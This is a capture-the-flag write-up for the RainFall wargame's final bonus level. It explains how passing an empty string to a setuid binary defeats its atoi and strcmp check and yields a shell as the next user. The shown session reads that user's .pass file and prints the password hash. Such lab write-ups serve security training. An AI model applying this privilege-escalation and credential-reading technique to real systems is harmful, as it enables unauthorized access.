# Bonus3

We can find an executable which print a newline when we pass it one argument :
```
bonus3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 end users 5595 Mar  6  2016 bonus3
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ ./bonus3 bla

bonus3@RainFall:~$ ./bonus3 bla bla
bonus3@RainFall:~$
```
After analyze it with gdb we can find just a `main()`.  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-RainFall/blob/main/bonus0/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-RainFall/blob/main/bonus0/source.c) for more details.  
The program need at least 1 argument (argv[1]) otherwise it exits, the program also reads the .pass file for next level and store it into a buffer via `fread()`.  
Then the program calls `atoi()` with argv[1] as a parameter and uses the result as an index for our buffer, at that index the program inserts a null byte.  
After that, the program do a comparaison on our buffer, it must be equal to argv[1] so that we execute a shell.  
The thing is we don't know the flag! But if we input an empty string as first argument, `atoi()` will return 0 since the string does not contain a numeric value representation.  
Therefore it will replace the first character in the buffer with a `\0` (buffer[atoi("")] = 0), and since strcmp stops at `\0` both string will be considered identical :
```
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ exit
bonus3@RainFall:~$ su end
Password:
end@RainFall:~$ ls -l
total 4
-rwsr-s---+ 1 end users 26 Sep 23  2015 end
end@RainFall:~$ cat end
Congratulations graduate!
end@RainFall:~$
```
Bonus3 passed!
